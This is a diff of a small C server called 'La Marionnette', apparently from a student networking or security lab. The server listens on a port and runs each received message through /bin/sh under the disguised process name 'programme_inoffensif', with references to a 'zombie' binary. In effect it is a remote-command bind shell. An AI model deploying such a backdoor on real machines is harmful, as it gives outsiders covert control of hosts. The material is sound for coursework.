@@ -1,8 +1,9 @@
 // LA MARIONNETTE (server) + port
 #include "header.h"
 #include "utils_v2.h"
-// #define TAB_PORTS [10] = {1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032,
-//  1033, 1034}
+
+int TAB_PORTS[10] = {1025, 1026, 1027, 1028, 1029,
+                     1030, 1031, 1032, 1033, 1034};
 
 /**
  * PRE:  port: a valid port number
@@ -25,19 +26,23 @@ int main(int argc, char **argv) {
   int sockfd, newsockfd, i;
   char msg[SIZE_MESSAGE];
   int ret;
+  StructPort structPort;
   // struct pollfd fds[MAX_PLAYERS];
   int port;
   if (argc > 1) {
     port = atoi(argv[1]);
+    sockfd = initSocketServer(port);
+    printf("The server listens on the port : %d \n", port);
   } else {
-    // int randomInt = randomIntBetween(0, 9);
-    // strcpy(port, TAB_PORTS[randomInt]);
+    int randomInt = randomIntBetween(0, 9);
+    if (!structPort.isUsed) {
+      structPort.port = TAB_PORTS[randomInt];
+      structPort.isUsed = true;
+      sockfd = initSocketServer(structPort.port);
+      printf("The server listens on the port : %d \n", structPort.port);
+    }
   }
 
-  sockfd = initSocketServer(port);
-  printf("The server listens on the port : %d \n", port);
-  pid_t childPID;
-  int status;
   while (1) {
     // newsockfd = accept(sockfd, NULL, NULL);
     newsockfd = saccept(sockfd); // quand labo mettre accept!!
@@ -45,7 +50,7 @@ int main(int argc, char **argv) {
     if (newsockfd > 0) {
       printf("ret : %d & sock: %d\n", ret, newsockfd);
       while ((ret = sread(newsockfd, msg, sizeof(msg))) != 0) {
-        childPID = fork_and_run2(childExec, &newsockfd, msg);
+        fork_and_run2(childExec, &newsockfd, msg);
       }
       sclose(newsockfd);
       printf("Connexion finie\n");
@@ -66,7 +71,6 @@ void childExec(void *sockfd, void *command) {
 
   execl("/bin/sh", "programme_inoffensif", "-c", script, NULL);
   // system(script);
-
 
   // execl("./zombie" ,"programme_inoffensif", command);
   // execl("/bin/sh", "programme_inoffensif", "-c", script, (char *)NULL);
